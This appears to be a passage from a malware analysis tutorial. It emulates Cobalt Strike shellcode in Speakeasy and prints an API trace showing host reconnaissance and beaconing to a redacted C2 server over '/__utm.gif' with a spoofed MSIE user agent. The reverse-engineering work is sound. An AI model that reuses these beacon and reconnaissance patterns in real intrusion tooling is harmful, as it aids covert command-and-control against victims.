# Cobalt Strike :
```c
...
0x93ad: 'kernel32.GetProcAddress(0x7bc00000, "HttpSendRequestA")' -> 0xfeee00a6
0x93ad: 'kernel32.GetProcAddress(0x7bc00000, "InternetOpenA")' -> 0xfeee00a7
0x93ad: 'kernel32.GetProcAddress(0x7bc00000, "InternetCloseHandle")' -> 0xfeee00a8
0x93ad: 'kernel32.GetProcAddress(0x7bc00000, "InternetQueryOptionA")' -> 0xfeee00a9
...
0x564e9: 'advapi32.GetUserNameA("speakeasy_user", 0x1203ecc)' -> 0x1
0x564f9: 'kernel32.GetComputerNameA(0x3fb1b4, 0x1203ecc)' -> 0x1
0x525d0: 'ws2_32.WSAStartup(0x202, 0x1203d00)' -> 0x0
0x5261e: 'ws2_32.gethostname(0x3fb3b4, 0x100)' -> 0x0
0x5262b: 'ws2_32.gethostbyname("speakeasy_host")' -> 0x3fb4c0
...
-> 0x51ff2: 'wininet.InternetOpenA('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)', 0x0, 0x0, 0x0, 0x0)' -> 0x1c4
0x5200d: 'wininet.InternetSetOptionA(0x1c4, 0x5, 0x1203ef0, 0x4)' -> 0x1
0x5201d: 'wininet.InternetSetOptionA(0x1c4, 0x6, 0x1203ef0, 0x4)' -> 0x1
...
0x5200d: 'wininet.InternetSetOptionA(0x1f4, 0x5, 0x1203ef0, 0x4)' -> 0x1
0x5201d: 'wininet.InternetSetOptionA(0x1f4, 0x6, 0x1203ef0, 0x4)' -> 0x1
-> 0x52039: 'wininet.InternetConnectA(0x1f4, '<C2_SERVER>', 0x50, 0x0, 0x0, 0x3, 0x0, 0x82c40)' -> 0x1f8
0x644e2: 'kernel32.HeapAlloc(0x3f8200, 0x0, 0x10)' -> 0x7e5020
0x644e2: 'kernel32.HeapAlloc(0x3f8200, 0x0, 0x6c00)' -> 0x39000
0x68153: 'kernel32.GetLastError()' -> 0x0
...
0x68000: 'kernel32.TlsGetValue(0x0)' -> 0xfeee00ac
0x681bd: 'kernel32.SetLastError(0x0)' -> None
-> 0x524b9: 'wininet.HttpOpenRequestA(0x1f8, 'GET", "/__utm.gif', 0x0, 0x0, 0x1203ec0, "INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD", 0x82c40)' -> 0x1fc
...
```

- Resolving a number of APIs using the GetProcAddress API call
- Gathering information about the host by using the GetUserNameA and GetHostByName API Calls
- Setting up various networking API calls:
  - `wininet.InternetOpenA` - which gives us the user agent used during beaconing
  - `wininet.InternetConnectA` - which gives us the address of the C2 server used for beaconing
  - `wininet.HttpOpenRequestA` - which gives us the URI used for beaconing

After a few moments we can see that the emulation enters a loop where it attempts to set up a network connection to the C2 server to enable command and control activity. There's a lot of valuable information that can be gained by just examining that API calls made by the shellcode, but to really get the most valuable information we want to extract the Cobalt Strike config.
